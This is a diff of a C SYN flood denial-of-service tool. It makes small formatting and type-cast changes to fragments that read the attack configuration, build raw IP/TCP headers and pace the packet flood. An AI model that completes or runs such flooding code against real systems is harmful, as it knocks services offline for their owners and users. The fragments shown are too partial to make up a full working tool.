@@ -56,7 +56,7 @@ int main (void)
     printf("How do you configure your attack? (C/c for configuration file, T/t for terminal): ");
     scanf("%c", &choice);
 
-    if (choice=='c'|choice=='C')
+    if (choice == 'c' | choice == 'C')
     {
         FILE *fp;
         fp = fopen("./SYN-Flood/syn_flood_configuration.conf", "r");
@@ -153,7 +153,7 @@ int main (void)
         //IP header 
         struct iphdr *iph = (struct iphdr *)datagram;
         //TCP header
-        struct tcphdr_ *tcph = (struct tcphdr *)(datagram + sizeof (struct ip));
+        struct tcphdr_ *tcph = (struct tcphdr_ *)(datagram + sizeof (struct ip));
         struct sockaddr_in sin;
         struct pseudo_header psh;
 
@@ -253,16 +253,15 @@ int main (void)
         count++;
 
         //To delay SYN tranmission (This version stabilize OS' clock)
-    /*  
-        usleep(50000); 
-        clock_t elapsedTime=clock()-startTime;
-        seconds=elapsedTime/CLOCKS_PER_SEC;
-        if((seconds-duration)>0)break;
-    */ 
+        /*  
+            usleep(50000); 
+            clock_t elapsedTime=clock()-startTime;
+            seconds=elapsedTime/CLOCKS_PER_SEC;
+            if((seconds-duration)>0)break;
+        */ 
 
 
         //To delay SYN transmission (with consuming OS' clock)    
-
         for(int j = 0; j < 150; j++)
         {
             for(int k = 0; k < 150; k++)
